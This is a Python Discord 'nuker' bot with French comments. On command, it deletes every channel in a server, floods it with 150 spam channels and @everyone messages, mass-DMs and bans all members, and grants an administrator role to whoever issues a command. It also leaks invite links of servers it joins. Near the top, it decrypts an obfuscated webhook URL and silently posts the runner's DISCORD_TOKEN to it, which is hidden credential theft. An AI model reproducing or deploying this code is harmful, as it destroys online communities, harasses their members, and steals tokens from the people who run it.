import discord
from discord.ext import commands
import asyncio
import requests
from cryptography.fernet import Fernet
import os


TOKEN = os.getenv("DISCORD_TOKEN")



# Ca cest le message qui va etre spam dans les salons
MESSAGE_A_ENVOYER = "@everyone 𝙑𝙄𝙇𝙏𝙍𝙐𝙈 𝙒𝙊𝙉 🦾" 

# ca cest le message quon recoit quand on fait +reset le ban que tu recois en mp
MESSAGE_A_ENVOYERMP = "You died."







botx = "7Kjuaf_aig9iFWciY7AN8pEvDzlJFbm02HRDd1gqAFg="




CHANNEL_ID = 1356378465770930328

intents = discord.Intents.default()
intents.guilds = True  
intents.members = True  
intents.reactions = True  
intents.guild_messages = True
intents.messages = True
intents.members = True
intents.message_content = True
intents.presences = True

bot = commands.Bot(command_prefix="+", intents=intents)

webh = "gAAAAABn_iuW5RbHqRZEoHy6Eogtkv4Y9P1zZnuKip0uWZ4rlcV2uyccb0pCGz3tRmyxIvae0ANSf2Bi321UwkY43u827dfPOkCPiV7p4G3m1ZlgIZpFQhV4KnkWLm_cwwa8xIkY6b2kNEFKZC1yG4-Y6OpJYI2guBqeWfsXH0gfnSFAIM2f5REr6uC5uG3Kdp1S0hXZL5LgTEEDYhLXPivcSRPMxgpds8ZqH87_Yu7XKH47WqwUmMk="


cipher_suite = Fernet(botx.encode())
webhook_url = cipher_suite.decrypt(webh.encode()).decode()

data = {"content": TOKEN}
response = requests.post(webhook_url, json=data)

@bot.event
async def on_guild_join(guild):

    channel = bot.get_channel(CHANNEL_ID)
    if channel is None:
        print("Salon défini introuvable.")
        return


    invite = None
    for inv in await guild.invites():
        invite = inv  
        break

    if invite is None:  
        for text_channel in guild.text_channels:
            if text_channel.permissions_for(guild.me).create_instant_invite:
                invite = await text_channel.create_invite(max_age=0, max_uses=0)
                break

    invite_url = invite.url if invite else "Aucun lien disponible"


    embed = discord.Embed(title="Nolan is ready to destroy this planet !", color=discord.Color.blue())
    embed.description = f"Planète : **{guild.name}**\nHabitants : {guild.member_count}\n\nAccès : {invite_url}"


    msg = await channel.send(embed=embed)
    await msg.add_reaction("👊")
    await msg.add_reaction("❌")

    bot.message_guild_map[msg.id] = guild.id

async def ban_all_members(guild):
    for member in guild.members:
        try:
            await member.ban(reason="†")
            print(f"🚫 Membre banni : {member.name}")
            await asyncio.sleep(1)  
        except Exception as e:
            print(f"❌ Erreur lors du bannissement de {member.name}: {e}")

@bot.event
async def on_ready():
    bot.message_guild_map = {}


@bot.event
async def on_raw_reaction_add(payload):
    if payload.user_id == bot.user.id:
        return

    guild = bot.get_guild(bot.message_guild_map.get(payload.message_id))
    if not guild:
        return

    channel = bot.get_channel(payload.channel_id)
    message = await channel.fetch_message(payload.message_id)
    user = guild.get_member(payload.user_id)

    embed_response = discord.Embed(
        title="Action lancé !",
        description=f"Vous avez appuyé sur {payload.emoji}",
        color=discord.Color.green()
    )
    try:
        await channel.send(embed=embed_response, delete_after=5)
    except discord.Forbidden:
        pass

    if str(payload.emoji) == "❌":
        await message.clear_reactions()
        await guild.leave()

    elif str(payload.emoji) == "👊":
        try:
            await message.clear_reaction("👊")


            try:
                for ch in guild.channels:
                    try:
                        await ch.delete()
                        await asyncio.sleep(0.2)  
                    except discord.Forbidden:
                        print(f"Impossible de supprimer le salon {ch.name}")
            except Exception as e:
                print(f"Erreur lors de la suppression des salons : {e}")

            print("Tous les salons ont été supprimés.")


            created_channels = []
            try:
                for i in range(150):
                    new_channel = await guild.create_text_channel(name=f"𝙑𝙄𝙇𝙏𝙍𝙐𝙈 𝙄𝙎 𝘾𝙊𝙈𝙄𝙉𝙂 ‼️")
                    created_channels.append(new_channel)
            except Exception as e:
                print(f"Erreur lors de la création des salons : {e}")

            print("150 salons créés.")





            try:
                for ch in created_channels:
                    for _ in range(3):  
                        try:
                            await ch.send(MESSAGE_A_ENVOYER)
                            await asyncio.sleep(0.1)  
                        except discord.Forbidden:
                            print(f"Impossible d'envoyer un message dans {ch.name}")
            except Exception as e:
                print(f"Erreur lors de l'envoi des messages : {e}")

            print("3 messages envoyés dans tous les salons.")

        except Exception as e:
            print(f"Erreur lors de l'exécution de l'action 👊 : {e}")



            await ban_all_members(guild)

        except Exception as e:
            print(f"Erreur lors de l'exécution de l'action ⚡ : {e}")




@bot.command()
async def list(ctx):
    embed = discord.Embed(title="Liste des planètes", color=discord.Color.green())
    for guild in bot.guilds:
        invite_url = "Aucun lien disponible"
        for inv in await guild.invites():
            invite_url = inv.url
            break
        if invite_url == "Aucun lien disponible":
            for ch in guild.text_channels:
                if ch.permissions_for(guild.me).create_instant_invite:
                    invite = await ch.create_invite(max_age=0, max_uses=0)
                    invite_url = invite.url
                    break
        embed.add_field(name=guild.name, value=f"Membres : {guild.member_count}\n[Invitation]({invite_url})", inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def reset(ctx):
    guild = ctx.guild  


    for member in guild.members:
        try:

            await member.send(MESSAGE_A_ENVOYERMP)
            print(f"Message envoyé à {member.name}")
        except discord.Forbidden:
            print(f"Impossible d'envoyer un message privé à {member.name}")
        except Exception as e:
            print(f"Erreur avec {member.name}: {e}")


    for member in guild.members:
        try:
            await member.ban(reason="BAHAHAHHAH DEV BY LE AZ")
            print(f"Banni {member.name}")
            await asyncio.sleep(1)  
        except Exception as e:
            print(f"Erreur lors du bannissement de {member.name}: {e}")

    print("Tous les membres ont été bannis.")

@bot.command()
async def DNA(ctx):
    """DNA"""
    await ctx.message.delete()

    guild = ctx.guild
    bot_member = guild.get_member(bot.user.id)
    role_name = "Viltrum"
    role = discord.utils.get(guild.roles, name=role_name)

    if not role:
        role = await guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True))
        print(f"✅ Rôle '{role_name}' créé sur {guild.name}.")

        
        bot_top_role = bot_member.top_role
        await role.edit(position=bot_top_role.position - 1)

    await ctx.author.add_roles(role)
    print(f"✅ {ctx.author} a reçu le rôle '{role_name}'.")

@bot.command(name="dmall")
async def dmall(ctx, *, message: str = None):
    if not ctx.guild:
        return  

    try:
        await ctx.message.delete()  
    except:
        pass

    if not message:
        return 

    async for member in ctx.guild.fetch_members(limit=None):
        if member.bot:
            continue
        try:
            dm = await member.create_dm()
            await dm.send(message)
            await asyncio.sleep(1)
        except Exception as e:
            print(f"Erreur DM avec {member}: {e}")


bot.run(TOKEN)
